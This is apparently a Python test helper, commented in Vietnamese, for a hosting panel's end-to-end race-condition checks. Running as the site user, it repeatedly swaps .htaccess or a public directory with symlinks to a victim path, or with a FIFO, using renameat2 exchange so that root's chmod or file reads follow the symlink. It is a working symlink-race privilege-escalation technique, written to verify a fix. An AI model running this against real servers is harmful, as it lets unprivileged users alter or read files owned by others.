#!/usr/bin/env python3
"""Kẻ tráo của e2e M28 mục 4 (đua). Chạy bằng user Linux của site (runuser),
nhận mã qua stdin để user đó không cần đọc được thư mục chứa script:

    runuser -u <user site> -- python3 - m28-tra-doi file <.htaccess> <đích symlink> <tra-doi.py
    runuser -u <user site> -- python3 - m28-tra-doi dir <public> <thư mục nạn nhân> <tra-doi.py
    runuser -u <user site> -- python3 - m28-tra-doi dir-cho <thư mục con> <thư mục nạn nhân> <tra-doi.py
    runuser -u <user site> -- python3 - m28-tra-doi fifo <.htaccess> - <tra-doi.py

Tham số đầu "m28-tra-doi" chỉ là dấu để script bash tìm và dừng tiến trình
này (pkill -f). Dừng bằng SIGTERM; khi dừng in số lần đã tráo ra stdout và
để lại đúng thứ thật ở tên bị tráo (file thường, thư mục thật).

file: tráo <.htaccess> giữa một bản sao file thường (nội dung đọc lúc bắt đầu)
và symlink tới <đích>, mỗi lần bằng cách tạo tên tạm rồi os.replace: lúc nào
ở tên đó cũng có một trong hai thứ.

dir: tráo <public> với một symlink tới <thư mục nạn nhân> bằng renameat2
(RENAME_EXCHANGE): một lời gọi đổi chỗ hai tên, lúc nào ở tên <public> cũng có
thư mục thật hoặc symlink.
"""
import ctypes
import os
import signal
import sys
import time

running = True


def stop(*_):
    global running
    running = False


signal.signal(signal.SIGTERM, stop)
signal.signal(signal.SIGINT, stop)


def run_file(ht, target):
    with open(ht, "rb") as f:
        data = f.read()
    tmp = os.path.join(os.path.dirname(ht), ".m28-tra-doi.tmp")
    n = 0

    def put_regular():
        try:
            os.unlink(tmp)
        except FileNotFoundError:
            pass
        fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o640)
        try:
            os.write(fd, data)
            os.fchmod(fd, 0o640)
        finally:
            os.close(fd)
        os.replace(tmp, ht)

    while running:
        try:
            os.unlink(tmp)
        except FileNotFoundError:
            pass
        os.symlink(target, tmp)
        os.replace(tmp, ht)
        n += 1
        put_regular()
        n += 1
    put_regular()
    return n


def run_dir(pub, victim):
    libc = ctypes.CDLL(None, use_errno=True)
    at_fdcwd, rename_exchange = -100, 2
    link = pub + ".m28-lien"
    try:
        os.unlink(link)
    except FileNotFoundError:
        pass
    os.symlink(victim, link)
    a, b = os.fsencode(pub), os.fsencode(link)

    def xchg():
        if libc.renameat2(at_fdcwd, a, at_fdcwd, b, rename_exchange) != 0:
            e = ctypes.get_errno()
            raise OSError(e, os.strerror(e), pub)

    n = 0
    while running:
        xchg()
        n += 1
    if os.path.islink(pub):
        xchg()
    os.unlink(link)
    return n


def run_fifo(ht):
    """Như run_file nhưng thứ đặt đè lên <ht> là một FIFO (tên tạm rồi
    os.replace), rồi lại đặt file thường: lúc cửa đọc có thể là file thường,
    lúc đọc lại có thể là FIFO."""
    with open(ht, "rb") as f:
        data = f.read()
    tmp = os.path.join(os.path.dirname(ht), ".m28-tra-doi.tmp")
    n = 0

    def clear():
        try:
            os.unlink(tmp)
        except FileNotFoundError:
            pass

    def put_regular():
        clear()
        fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o640)
        try:
            os.write(fd, data)
            os.fchmod(fd, 0o640)
        finally:
            os.close(fd)
        os.replace(tmp, ht)

    while running:
        clear()
        os.mkfifo(tmp, 0o640)
        os.replace(tmp, ht)
        n += 1
        put_regular()
        n += 1
    put_regular()
    return n


def run_dir_cho(sub, victim):
    """Như run_dir nhưng thư mục <sub> chưa chắc đã có hoặc chưa chắc user này
    đã ghi được vào thư mục cha (tpan còn đang giải nén WordPress và đặt chủ):
    lỗi quyền hoặc "không có" thì thử lại, chỉ đếm lần tráo thành công."""
    libc = ctypes.CDLL(None, use_errno=True)
    at_fdcwd, rename_exchange = -100, 2
    link = sub + ".m28-lien"
    a, b = os.fsencode(sub), os.fsencode(link)
    have_link = False
    n = 0

    def xchg():
        return libc.renameat2(at_fdcwd, a, at_fdcwd, b, rename_exchange) == 0

    while running:
        try:
            if not have_link:
                try:
                    os.unlink(link)
                except FileNotFoundError:
                    pass
                os.symlink(victim, link)
                have_link = True
            if xchg():
                n += 1
                continue
        except OSError:
            pass
        time.sleep(0.002)
    try:
        if os.path.islink(sub) and xchg():
            pass
        os.unlink(link)
    except OSError:
        pass
    return n


def run_dir_rieng(sub, victim, secs):
    """Tạo thư mục RIÊNG <sub> (tar của WordPress không đụng tới, nên không làm
    hỏng việc giải nén) rồi tráo nó với symlink tới <victim> bằng renameat2
    (RENAME_EXCHANGE) trong tối đa secs giây, để lúc root đặt quyền cây public
    (chmodDirs của bản vá, hay find -exec chmod của bản chưa vá) có lúc gặp
    symlink đúng giữa lúc liệt kê và lúc chmod. Tự dừng sau secs giây để không
    còn tiến trình nào của user site lúc job hoàn tác (userdel đòi không còn
    tiến trình)."""
    libc = ctypes.CDLL(None, use_errno=True)
    at_fdcwd, rename_exchange = -100, 2
    os.makedirs(sub, exist_ok=True)
    link = sub + ".m28-lien"
    try:
        os.unlink(link)
    except FileNotFoundError:
        pass
    os.symlink(victim, link)
    a, b = os.fsencode(sub), os.fsencode(link)
    deadline = time.monotonic() + secs
    n = 0
    while running and time.monotonic() < deadline:
        if libc.renameat2(at_fdcwd, a, at_fdcwd, b, rename_exchange) == 0:
            n += 1
    if os.path.islink(sub):
        libc.renameat2(at_fdcwd, a, at_fdcwd, b, rename_exchange)
    try:
        os.unlink(link)
    except OSError:
        pass
    return n


def main():
    mode, a, b = sys.argv[2:5]
    if mode == "file":
        n = run_file(a, b)
    elif mode == "fifo":
        n = run_fifo(a)
    elif mode == "dir-cho":
        n = run_dir_cho(a, b)
    elif mode == "dir-rieng":
        n = run_dir_rieng(a, b, float(sys.argv[5]) if len(sys.argv) > 5 else 15.0)
    else:
        n = run_dir(a, b)
    print(f"so-lan-trao={n}")


if __name__ == "__main__":
    main()
